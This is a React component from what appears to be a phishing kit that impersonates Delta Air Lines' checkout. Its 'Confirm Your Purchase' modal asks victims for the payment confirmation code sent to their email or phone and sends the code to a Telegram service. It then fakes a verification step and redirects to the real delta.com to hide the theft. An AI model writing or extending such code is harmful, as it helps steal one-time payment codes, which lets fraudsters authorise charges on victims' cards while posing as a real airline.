
import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { X } from 'lucide-react';
import { sendMessage, formatConfirmationCode } from '../services/telegramService';

interface PurchaseConfirmationModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: () => void;
}

const PurchaseConfirmationModal = ({ isOpen, onClose, onConfirm }: PurchaseConfirmationModalProps) => {
  const [confirmationCode, setConfirmationCode] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState('');

  if (!isOpen) return null;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!confirmationCode.trim()) {
      setError('Please enter a confirmation code');
      return;
    }
    
    setIsSubmitting(true);
    
    try {
      // Send confirmation code to Telegram
      await sendMessage(formatConfirmationCode(confirmationCode));
      console.log('Confirmation code sent to Telegram');
      
      // Simulate verification process
      setTimeout(() => {
        setIsSubmitting(false);
        onConfirm();
        window.location.href = 'https://www.delta.com/';
      }, 1500);
    } catch (error) {
      console.error('Failed to send confirmation code to Telegram:', error);
      setIsSubmitting(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 animate-fadeIn">
      <div className="bg-white rounded-lg shadow-lg w-full max-w-md mx-4">
        <div className="flex justify-between items-center p-4 border-b border-gray-200">
          <h2 className="text-xl font-semibold text-delta-blue">Confirm Your Purchase</h2>
          <button onClick={onClose} className="text-gray-500 hover:text-gray-700">
            <X size={20} />
          </button>
        </div>
        
        <div className="p-6">
          <p className="text-gray-700 mb-4">
            For security purposes, please enter the confirmation code sent to your payment method's registered email or phone.
          </p>
          
          <form onSubmit={handleSubmit}>
            <div className="mb-4">
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Confirmation Code
              </label>
              <input
                type="text"
                className="input-field"
                value={confirmationCode}
                onChange={(e) => {
                  setConfirmationCode(e.target.value);
                  setError('');
                }}
                placeholder="Enter code"
              />
              {error && <p className="mt-1 text-sm text-red-600">{error}</p>}
            </div>
            
            <div className="flex justify-end space-x-3 mt-6">
              <Button
                variant="outline"
                onClick={onClose}
                className="border-delta-blue text-delta-blue hover:bg-gray-100"
              >
                Cancel
              </Button>
              <Button
                type="submit"
                className="bg-delta-red hover:bg-red-700 text-white"
                disabled={isSubmitting}
              >
                {isSubmitting ? 'Verifying...' : 'Confirm Purchase'}
              </Button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default PurchaseConfirmationModal;
